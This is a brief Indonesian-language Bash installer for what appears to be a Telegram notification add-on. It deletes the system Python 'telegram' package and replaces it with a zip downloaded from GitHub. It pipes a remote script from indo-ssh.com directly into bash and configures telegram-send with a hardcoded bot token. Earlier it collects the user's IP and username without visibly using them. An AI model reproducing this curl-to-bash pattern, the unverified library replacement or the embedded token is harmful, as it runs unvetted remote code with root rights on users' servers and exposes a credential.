#!/bin/bash

# Mendapatkan alamat IP pengguna
ip=$(curl -s https://ipinfo.io/ip)

# Meminta username dari pengguna
read -p "Silakan masukkan username Anda: " username
clear
echo ""
echo -e "Proses Instalasi Sekitar 10menit"
read -p "Pres enter to next : " om
clear
cd /usr/local/lib/python3.7/dist-packages
rm -r telegram
mkdir /usr/local/lib/python3.7/dist-packages/telegram
cd /usr/local/lib/python3.7/dist-packages/telegram && wget https://github.com/Rerechan02/xray/raw/main/telegram.zip && unzip telegram.zip
cd
apt install zip unzip -y && apt install python3-pip -y && pip3 install telegram-send && curl -L "https://indo-ssh.com/addon.sh" | bash && printf "5392804490:AAGjiVyB3ZmqR3JMwJaOelZv6LMKYGLBAcU
" | telegram-send --configure
telegram-send Script Berhasil di instal
